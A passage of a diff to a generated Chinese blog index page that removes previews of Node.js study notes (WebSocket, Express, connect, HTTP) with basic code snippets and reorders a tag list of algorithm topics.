class="built_in">console</span>.log(message);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
-    
-    <a class="article-more-a" href="/2020/09/29/nodeJs/10.%20WebSocket/#more">more >></a>
-    
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color5">node</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color5">《了不起的Node JS 将JavaScript进行到底》</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-    
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2020/09/29/nodeJs/10.%20WebSocket/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" target="_blank" rel="noopener" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-nodeJs/9. express" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2020/09/29/nodeJs/9.%20express/" target="_blank">9.Express</a>
-  
-    </h1>
-  
-
-
-  
-  
-<a href="/2020/09/29/nodeJs/9.%20express/" class="archive-article-date">
-        <time datetime="2020-09-29T11:14:24.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-29</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <h1 id="Express"><a href="#Express" class="headerlink" title="Express"></a>Express</h1><h2 id="一个小型express应用"><a href="#一个小型express应用" class="headerlink" title="一个小型express应用"></a><strong>一个小型express应用</strong></h2><h3 id="创建模块"><a href="#创建模块" class="headerlink" title="创建模块"></a>创建模块</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"name"</span>: <span class="string">"express-tweet"</span>,</span><br><span class="line">    <span class="attr">"version"</span>: <span class="string">"0.0.1"</span>,</span><br><span class="line">    <span class="attr">"dependencies"</span>: &#123;</span><br><span class="line">        <span class="attr">"express"</span>: <span class="string">"*"</span>,</span><br><span class="line">        <span class="attr">"ejs"</span>: <span class="string">"*"</span>,</span><br><span class="line">        <span class="attr">"superagent"</span>: <span class="string">"*"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-    
-    <a class="article-more-a" href="/2020/09/29/nodeJs/9.%20express/#more">more >></a>
-    
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color5">node</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color5">《了不起的Node JS 将JavaScript进行到底》</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-    
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2020/09/29/nodeJs/9.%20express/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" target="_blank" rel="noopener" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-nodeJs/8. connect 中间件" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2020/09/29/nodeJs/8.%20connect%20%E4%B8%AD%E9%97%B4%E4%BB%B6/" target="_blank">8.connect</a>
-  
-    </h1>
-  
-
-
-  
-  
-<a href="/2020/09/29/nodeJs/8.%20connect%20%E4%B8%AD%E9%97%B4%E4%BB%B6/" class="archive-article-date">
-        <time datetime="2020-09-29T11:13:24.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-29</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <h1 id="connect"><a href="#connect" class="headerlink" title="connect"></a>connect</h1><blockquote>
-<p>基于HTTP服务器的工具集，提供了一种新的组织代码的方式来与请求，响应对象进行交互，称中间件(middleware)</p>
-</blockquote>
-    
-    <a class="article-more-a" href="/2020/09/29/nodeJs/8.%20connect%20%E4%B8%AD%E9%97%B4%E4%BB%B6/#more">more >></a>
-    
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color5">node</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color5">《了不起的Node JS 将JavaScript进行到底》</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-    
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2020/09/29/nodeJs/8.%20connect%20%E4%B8%AD%E9%97%B4%E4%BB%B6/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" target="_blank" rel="noopener" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-nodeJs/7. HTTP" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2020/09/29/nodeJs/7.%20HTTP/" target="_blank">7.HTTP --TCP上层的超文本传输协议</a>
-  
-    </h1>
-  
-
-
-  
-  
-<a href="/2020/09/29/nodeJs/7.%20HTTP/" class="archive-article-date">
-        <time datetime="2020-09-29T11:12:24.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-29</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <h1 id="HTTP-–TCP上层的超文本传输协议"><a href="#HTTP-–TCP上层的超文本传输协议" class="headerlink" title="HTTP –TCP上层的超文本传输协议"></a>HTTP –TCP上层的超文本传输协议</h1><h2 id="HTTP结构"><a href="#HTTP结构" class="headerlink" title="HTTP结构"></a>HTTP结构</h2><blockquote>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">'http'</span>).createServer(<span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    res.writeHead(<span class="number">200</span>);</span><br><span class="line">    res.end(<span class="string">'Hello World'</span>);</span><br><span class="line"></span><br><span class="line">&#125;).listen(<span class="number">3000</span>);</span><br></pre></td></tr></table></figure>
-</blockquote>
-<blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP / 1.1 200 OK</span><br><span class="line">Date: Mon, 31 Aug 2020 22: 57: 14 GMT</span><br><span class="line">Connection: keep - alive</span><br><span class="line">Transfer - Encoding: chunked</span><br><span class="line">b</span><br><span class="line">Hello World</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
-</blockquote>
-    
-    <a class="article-more-a" href="/2020/09/29/nodeJs/7.%20HTTP/#more">more >></a>
-    
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color5">node</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color5">《了不起的Node JS 将JavaScript进行到底》</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-    
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2020/09/29/nodeJs/7.%20HTTP/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" target="_blank" rel="noopener" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
       <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
@@ -1362,6 +1410,10 @@
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color4">并查集</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color3">容斥</a>
               </li>
              
@@ -1374,7 +1426,7 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color4">并查集</a>
+                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color4">分治法</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1386,15 +1438,7 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color4">分治法</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color3">链表</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color4">字典树</a>
+                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color1">最小生成树</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1402,11 +1446,15 @@
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color3">链表</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color3">暴力</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color1">最小生成树</a>
+                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color4">字典树</a>
               </li>
             
             <div class="clearfix"></div>
